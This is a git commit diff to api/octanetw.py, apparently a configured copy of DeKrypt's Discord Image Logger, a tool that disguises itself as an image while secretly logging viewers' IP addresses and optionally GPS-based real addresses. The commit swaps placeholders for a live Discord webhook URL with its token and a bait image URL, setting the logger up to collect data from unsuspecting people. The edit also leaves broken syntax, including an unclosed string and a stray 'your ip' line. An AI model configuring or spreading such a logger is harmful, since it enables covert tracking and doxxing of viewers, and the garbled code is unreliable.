fbf8f6d166f6e982f0eeab159aa1efadc631b622
trenerax <143008658+trenerax@users.noreply.github.com>
2023-08-24 13:24:56 +0200

    Update octanetw.py

--- api/octanetw.py
+++ api/octanetw.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1143917008061214851/XW-dRXJc74rAwoACYvASN3E6SOvVJLiA_hn9AhIrEE2h17IS5aSDm6L3bXS__3fZCsJu",
+    "image": "https://img.rl.insider.gg/ingameViews/small/IZJvLR3pPNd69SvOTkwnE0sgVYTRjoqk.jpg, # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -26,7 +26,7 @@ config = {
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
-    "message": { # Show a custom message when the user opens the image
+    "message": { your ip
         "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
